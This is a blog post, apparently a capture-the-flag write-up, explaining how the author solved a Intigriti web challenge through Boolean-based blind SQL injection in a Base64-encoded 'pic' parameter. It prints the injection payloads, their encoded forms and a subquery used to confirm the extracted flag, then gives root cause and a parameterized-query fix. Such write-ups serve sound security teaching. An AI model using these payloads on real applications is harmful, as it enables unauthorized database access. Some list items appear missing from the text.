# How I Solved Intigriti’s September 2026 Challenge

- **Source URL:** https://medium.com/@ronaldo.shrestha713/how-i-solved-intigritis-september-2026-challenge-e29292a20662
- **Fetched from:** https://medium.com/@ronaldo.shrestha713/how-i-solved-intigritis-september-2026-challenge-e29292a20662?source=rss-f4b95274e1f6------2
- **Fetched:** 2026-11-25
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/14927 (id 14927)
- **Method:** medium-rss-feed (full content:encoded) readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
- **Author/Published (RSS):** Ronaldo Shrestha / Tue, 29 Sep 2026 00:01:02 GMT

While testing the Critter Gallery challenge, I noticed that the pic parameter accepts Base64-encoded values. Initially, this looked like an unusual input-handling mechanism rather than an obvious injection point.

After decoding the parameter and testing SQL metacharacters, I discovered that the value was vulnerable to **Boolean-based blind SQL injection**.

The interesting part was that the application did not need to return database errors or query results directly. It returned noticeably different application responses depending on whether an injected SQL condition evaluated to TRUE or FALSE.

This allowed me to turn the endpoint into a Boolean oracle and progressively enumerate the database until I reached the flag.

The main functionality was available through:

GET /challenge.php?pic=\<value>

The pic parameter contains Base64-encoded animal names.

For example:

Zm94

decodes to:

fox

A normal request therefore looks like:

GET /challenge.php?pic=Zm94

The application returns the corresponding critter.

The important observation was that Base64 encoding is **not encryption or sanitization**. If the server decodes the value before using it in a SQL query, SQL syntax can still reach the database.

I started with a simple Boolean condition:

' OR 1=1-- -

Since the application expects Base64, I encoded the payload:

JyBPUiAxPTEtLSAt

I then sent:

GET /challenge.php?pic=JyBPUiAxPTEtLSAt

The application returned **all critters**.

To confirm that this behavior was actually controlled by the Boolean condition, I changed the condition to a false expression:

' OR 1=2-- -

Base64:

JyBPUiAxPTItLSAt

Request:

GET /challenge.php?pic=JyBPUiAxPTItLSAt

This time the application returned:

No critter goes by that name yet.

This gave me a reliable Boolean oracle:

1=1 → all critters

1=2 → no critter

At this point, I could test arbitrary SQL conditions by observing which response was returned.

I used the Boolean oracle to progressively enumerate the application’s database.

First, I identified the active database as:

critter\_gallery

I then enumerated the tables and found:

animals

secret\_vault

The secret\_vault table was particularly interesting.

I enumerated its columns and obtained:

id

note

The table contained a single row.

This confirmed that the SQL injection could be used to access data outside the application’s intended critter functionality.

Since the application only provided a Boolean response, I extracted the note value one character at a time.

Conceptually, each request asked the database a question such as:

Is character 1 of the note equal to 'I'?

The response told me whether the condition was true or false.

Repeating this process for each position eventually produced:

`INTIGRITI{01a09f56-74a2-700b-a849-ffe6742327b2}`
I then verified the complete value using an exact comparison:

' OR (SELECT note FROM secret\_vault LIMIT 1) =

'INTIGRITI{01a09f56-74a2-700b-a849-ffe6742327b2}'-- -

The application returned the response corresponding to a true condition, confirming the extracted value.

The interesting aspect of this vulnerability is the Base64 layer.

The application effectively processes the input like this:

Attacker input

↓

Base64 encoding

↓

Application receives encoded value

↓

Base64 decoding

↓

SQL query processing

↓

Database

Therefore, an attacker can simply encode the SQL payload before sending it.

becomes:

Once decoded by the application, the database receives the SQL injection payload.

Base64 therefore provides **encoding**, not SQL injection protection.

The vulnerability allows an unauthenticated attacker to use the pic parameter as a Boolean-based SQL injection oracle.

During exploitation, I was able to:

In a real application, the same vulnerability could potentially expose sensitive information accessible to the application’s database account, depending on the database user’s privileges.

The root cause is insufficient separation between **user-controlled data and SQL syntax**.

The decoded pic value is apparently being incorporated into a SQL query without proper parameterization.

Base64 encoding does not change this because the encoded input is eventually decoded back into attacker-controlled content.

The application should use **prepared statements / parameterized queries** when interacting with the database.

The decoded pic value should be treated strictly as data:

Base64 decode

↓

Validate input

↓

Bind as SQL parameter

↓

Execute prepared query

Additional defenses include:

**CWE-89 — Improper Neutralization of Special Elements used in an SQL Command (‘SQL Injection’)**

**Vulnerability type:** Boolean-Based Blind SQL Injection

**Affected parameter:** pic

**Affected endpoint:** /challenge.php

**Demonstrated impact:** Unauthorized database information disclosure
